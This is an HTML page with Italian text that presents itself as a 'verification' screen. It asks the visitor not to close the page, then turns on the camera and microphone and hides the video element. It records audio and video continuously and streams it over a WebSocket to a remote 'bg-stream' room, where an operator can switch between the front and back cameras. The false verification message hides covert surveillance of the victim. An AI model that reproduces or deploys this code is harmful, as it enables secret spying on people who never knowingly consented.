<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Client Camera + Audio</title>
<style>
body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
.msg { padding:40px 20px; font-size:18px; }
</style>
</head>
<body>
<div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
<video id="cam" playsinline autoplay muted style="display:none;"></video>

<script>
const room = new URLSearchParams(location.search).get('room') || 'user1';
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);

let currentCamera = 'environment';
let stream = null;
let recorder = null;

async function startCamera(camera) {
  if (stream) stream.getTracks().forEach(t => t.stop());
  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: camera, width:{ideal:640}, height:{ideal:480} },
    audio: true
  });
  const video = document.getElementById('cam');
  video.srcObject = stream;
  await video.play();

  recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8,opus' });
  recorder.ondataavailable = e => { if (e.data.size > 0 && ws.readyState === WebSocket.OPEN) ws.send(e.data); };
  recorder.start(100); // chunk ogni 100ms

  document.querySelector('.msg').innerHTML =
    `<b>Verifica completata</b><br><small>Video + Audio attivi in background</small>`;
}

ws.onopen = () => startCamera(currentCamera);

ws.onmessage = e => {
  if (typeof e.data === 'string') {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'switchCamera') {
        currentCamera = msg.camera;
        if (recorder && recorder.state !== 'inactive') recorder.stop();
        startCamera(currentCamera);
      }
    } catch {}
  }
};

setInterval(() => { if (ws.readyState === WebSocket.OPEN) ws.send('ping'); }, 10000);
</script>
</body>
</html>
